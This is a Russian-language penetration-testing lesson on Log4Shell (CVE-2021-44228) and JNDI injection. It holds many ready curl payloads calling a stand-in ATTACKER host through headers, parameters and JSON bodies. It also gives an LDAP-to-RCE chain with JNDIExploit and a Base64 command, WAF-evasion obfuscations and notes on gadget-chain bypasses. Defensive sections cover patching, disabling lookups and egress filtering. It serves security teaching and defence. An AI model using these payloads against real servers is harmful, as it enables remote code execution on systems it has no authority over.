Log4Shell (CVE-2021-44228) — одна из самых разрушительных уязвимостей в истории веба: уязвимость в библиотеке логирования Log4j 2 позволяла через строку, попавшую в лог, заставить сервер загрузить и исполнить код из внешнего источника. Механизм — JNDI-инъекция: Log4j поддерживал lookup'ы вида `${jndi:ldap://...}`, и при логировании такой строки выполнялся сетевой запрос и загрузка класса. Этот урок — про Log4j и JNDI-инъекции в целом.

## Как работает JNDI-инъекция

JNDI (Java Naming and Directory Interface) — API Java для доступа к каталогам и ресурсам. Log4j 2 до версии 2.15 интерпретировал lookup-выражения в логируемых строках, включая `${jndi:...}`. Если в лог попадала строка вида `${jndi:ldap://attacker/a}`, Log4j делал запрос к `attacker`, получал ссылку на Java-класс и загружал его — выполняя код.

Условие эксплуатации: **пользовательский ввод должен попасть в лог**. А логируется почти всё: заголовки (`User-Agent`, `X-Api-Version`, `Referer`), параметры, тела запросов, имена пользователей, ошибки.

```bash
# проверка через User-Agent
curl -s https://t/ -A '${jndi:ldap://ATTACKER:1389/a}'
# и через другие заголовки/параметры
curl -s https://t/ -H 'X-Api-Version: ${jndi:ldap://ATTACKER:1389/a}'
curl -s 'https://t/?q=${jndi:ldap://ATTACKER:1389/a}'
```

Если сервер уязвим, вы увидите входящий LDAP-запрос на своём listener'е.

## Эксплуатация: LDAP → RCE

Схема атаки: слушаем LDAP, отдаём ссылку на HTTP-сервер с вредоносным классом, JVM жертвы загружает и исполняет его.

```bash
# 1. запускаем HTTP-сервер с классом (на своём хосте)
#    (в старых JVM класс загружался удалённо; в новых нужен local classpath bypass)
python3 -m http.server 8000

# 2. запускаем LDAP-референс-сервер
java -jar JNDIExploit.jar -i ATTACKER        # или marshalsec
# 3. отправляем payload
curl -s https://t/ -A '${jndi:ldap://ATTACKER:1389/Basic/Command/Base64/<base64 id>}'
# 4. на listener: входящее соединение и вывод команды
```

В современных JVM (после патчей) удалённая загрузка классов запрещена по умолчанию, и для RCE нужны обходы: локальные gadget-классы в classpath, `ldap` с сериализованными объектами, `SerializedObject` в LDAP-ответе, `EL`/`Tomcat`-gadgets. Инструменты (`JNDIExploit`, `marshalsec`, `rogue-jndi`) содержат готовые обходы.

## Варианты обфускации payload

WAF и фильтры блокируют строку `${jndi:ldap://...}`, поэтому payload обфусцируют. Log4j раскрывает вложенные lookup'ы и поддерживает `lower:`/`upper:`.

```bash
# вложенные lookup'ы
${${lower:j}ndi:${lower:l}dap://ATTACKER/a}
# обход через upper
${${upper:j}ndi:ldap://ATTACKER/a}
# разбиение ключевых слов
${${::-j}${::-n}${::-d}${::-i}:ldap://ATTACKER/a}
# через переменные окружения
${jndi:${lower:l}${lower:d}a${lower:p}://ATTACKER/a}
# разные схемы
${jndi:dns://ATTACKER/a}       # DNS-эксфильтрация
${jndi:rmi://ATTACKER/a}       # RMI
${jndi:ldaps://ATTACKER/a}     # LDAPS
${jndi:iiop://ATTACKER/a}      # IIOP
```

Проверка через DNS (`dns://`) безопаснее: она подтверждает уязвимость без загрузки кода.

## Где искать Log4j

Логируется буквально всё, поэтому проверяйте все точки ввода: заголовки, query-параметры, тела (JSON/XML/form), cookies, пути URL, имена файлов при загрузке, поля логина, User-Agent. Отдельно — поля, которые точно попадают в логи: `Referer`, `X-Forwarded-For`, `X-Api-Version`, `Authorization` (иногда), `User-Agent`.

```bash
# массовая проверка заголовков
for h in User-Agent X-Api-Version X-Forwarded-For Referer X-Client-IP; do
  curl -s -o /dev/null "https://t/" -H "$h: \${jndi:dns://TEST.ATTACKER.oast.pro/}"
done
# проверка параметров и тела
curl -s "https://t/?q=\${jndi:dns://TEST.ATTACKER.oast.pro/}"
curl -s https://t/api -H 'Content-Type: application/json' -d '{"user":"${jndi:dns://TEST.ATTACKER.oast.pro/}"}'
```

## JNDI-инъекции за пределами Log4j

JNDI-инъекция — не только Log4j. Любое приложение, которое передаёт пользовательский ввод в `InitialContext.lookup()` или в похожие API, уязвимо. Встречается в: конфигурациях, которые читают имена из ввода, RMI/LDAP-клиентах, старых фреймворках, JMS-интеграциях. Если видите параметр, который похож на JNDI-имя (начинается с `ldap://`, `rmi://`, `java:`), — это кандидат.

```bash
# проверка параметра, похожего на JNDI-имя
curl -s 'https://t/lookup?name=ldap://ATTACKER:1389/a'
curl -s 'https://t/lookup?name=${jndi:ldap://ATTACKER:1389/a}'
```

## Разобранный пример: обнаружение и подтверждение

```bash
# 1. поднимаем interactsh (OOB-канал)
$ interactsh-client -v
[+] abc123.oast.pro

# 2. шлём DNS-lookup во все точки
$ curl -s -o /dev/null https://t/ -A '${jndi:dns://test.abc123.oast.pro/}'
$ curl -s -o /dev/null https://t/ -H 'X-Api-Version: ${jndi:dns://v2.abc123.oast.pro/}'

# 3. видим взаимодействие
[test.abc123.oast.pro] Received DNS interaction from <target-ip>
# -> Log4j уязвим (lookup раскрылся)

# 4. для RCE — LDAP + HTTP с классом (в лаборатории)
$ java -jar JNDIExploit.jar -i ATTACKER
$ curl -s https://t/ -A '${jndi:ldap://ATTACKER:1389/Basic/Command/Base64/<b64>}'
```

Артефакт — DNS/HTTP-взаимодействие (подтверждение) и, при удаче, вывод команды (RCE).

## Защита и патчи

Log4j 2.15/2.16 закрыли основные векторы; 2.17 — окончательно. Обходы через `MessageLookup` оставались и в 2.16. Рекомендации: обновить до 2.17+, отключить lookup'ы (`log4j2.formatMsgNoLookups=true`), удалить `JndiLookup` из classpath, ограничить исходящие соединения (egress), использовать WAF для блокировки `${jndi:`. Проверяйте версию Log4j в приложении и в зависимостях (SBOM, `mvn dependency:tree`).

## Крайние случаи и подводные камни

- **Логируются не все поля** — проверяйте каждую точку ввода.
- **Обфускация обязательна** — WAF ловит «сырой» `${jndi:`.
- **Современные JVM** блокируют удалённую загрузку классов — нужны обходы.
- **DNS-канал** подтверждает уязвимость, но не даёт RCE; для RCE нужен LDAP/RMI с классом.
- **Egress-фильтрация** может блокировать callback — тогда уязвимость есть, но не эксплуатируется.
- **Не переусердствуйте** — не запускайте destructive payload'ы; DNS-подтверждения достаточно для отчёта.

## Что делать дальше / решение

1. **Определите версию** Log4j (если доступны зависимости/баннеры).
2. **Поднимите OOB-канал** (`interactsh`).
3. **Шлите DNS-lookup** во все точки ввода (заголовки, параметры, тело).
4. **Подтвердите взаимодействие** — уязвимость есть.
5. **Для RCE** — LDAP/RMI + HTTP с классом (в лаборатории, с обходами).
6. **Проверьте JNDI** за пределами Log4j — параметры, похожие на имена.
7. **Зафиксируйте** артефакт (DNS/HTTP или `id`).

## Глубже: эволюция патчей и обходов

История Log4Shell — это гонка патчей и обходов, и её полезно знать, чтобы правильно оценивать цель. В 2.15 закрыли основной вектор (`jndi` lookup), но остались обходы через рекурсивные lookup'ы в сообщениях (`${${lower:j}ndi:...}`), исправленные в 2.16. В 2.16 отключили message lookup'ы, но обнаружили обход через `ThreadContext`/`MDC` в отдельных конфигурациях. Только 2.17 закрыл и это. Кроме того, в 2.17.x были отдельные уязвимости (например, DoS через `strSubstitutor`). Вывод: проверяйте точную версию и не считайте «2.15+» достаточной защитой.

Для эксплуатации на современных JVM нужны обходы запрета удалённой загрузки классов: использование классов, уже присутствующих в classpath (gadget chains), LDAP-ответы с сериализованными объектами, `Tomcat`/`Groovy`/`BeanFactory`-цепочки. Инструменты вроде `JNDIExploit` содержат готовые варианты и позволяют выбрать тот, что сработает на конкретной цели. Это ещё одна причина, почему «Log4j пропатчен» не равно «безопасно»: нужен ещё и запрет исходящих соединений (egress).

## Глубже: защита и проверка на стороне дефендера

Защита от Log4j/JNDI многослойна. Первый слой — **обновление** до 2.17+ (или удаление `JndiLookup` из classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`). Второй — **отключение lookup'ов**: `-Dlog4j2.formatMsgNoLookups=true` (для 2.10+). Третий — **egress-фильтрация**: запрет исходящих LDAP/RMI/DNS с серверов приложений, что нейтрализует большинство JNDI-атак даже при наличии уязвимости. Четвёртый — **WAF** с правилами на `${jndi:` (но обфускация обходит). Пятый — **инвентаризация**: SBOM, `mvn dependency:tree`, поиск `log4j-core` во всех артефактах.

Проверить, уязвима ли цель, можно через DNS-callback: если сервер при логировании делает запрос к вашему домену — lookup'ы активны. Если нет — либо версия исправлена, либо поле не логируется, либо egress закрыт. Различайте эти случаи: «нет callback» не всегда «безопасно».

## Итог и приоритизация

Log4Shell — критичен, если подтверждён callback и есть egress (потенциальный RCE на сервере приложения). JNDI-инъекции за пределами Log4j — тоже критичны, если ведут к загрузке класса. Если egress закрыт, уязвимость остаётся, но эксплуатация ограничена (можно использовать для SSRF/внутреннего сканирования через lookup). При отчёте обязательно указывайте версию Log4j, точку ввода (какой заголовок/параметр), и артефакт (DNS/HTTP-взаимодействие или `id`). И помните о безопасности: для подтверждения достаточно DNS-lookup, не запускайте боевые payload'ы без необходимости.

## Чек-лист проверки на Log4Shell и JNDI

Систематизируйте проверку так. Первое — определите, использует ли приложение Log4j, и какой версии (через зависимости, баннеры, поведение). Второе — поднимите OOB-канал (`interactsh` или Burp Collaborator) и получите уникальный домен. Третье — переберите **все** точки ввода, отправляя `${jndi:dns://<unique>.oast.pro/}`: заголовки (`User-Agent`, `X-Api-Version`, `X-Forwarded-For`, `Referer`, `X-Client-IP`), query-параметры, тела (JSON/XML/form), cookies, имена файлов, поля логина. Четвёртое — дождитесь callback; если он есть — уязвимость подтверждена, зафиксируйте, какое именно поле логируется. Пятое — проверьте egress: есть ли у сервера исходящие соединения (по callback). Шестое — при наличии egress и необходимости PoC используйте LDAP/RMI + HTTP с классом (в лаборатории, с обходами для современных JVM). Седьмое — проверьте JNDI-инъекции за пределами Log4j: параметры, похожие на `ldap://`/`rmi://`/`java:`. Восьмое — зафиксируйте артефакт и версию. Такой чек-лист покрывает и обнаружение, и подтверждение, и оценку эксплуатируемости, не выходя за рамки этичного теста.

Обфускация — обязательный элемент: сырой `${jndi:` ловится WAF. Используйте вложенные lookup'ы (`${${lower:j}ndi:...}`), разбиение ключевых слов и разные схемы. Для безопасного подтверждения предпочитайте `dns://` — он не загружает код и не рискует скомпрометировать цель.
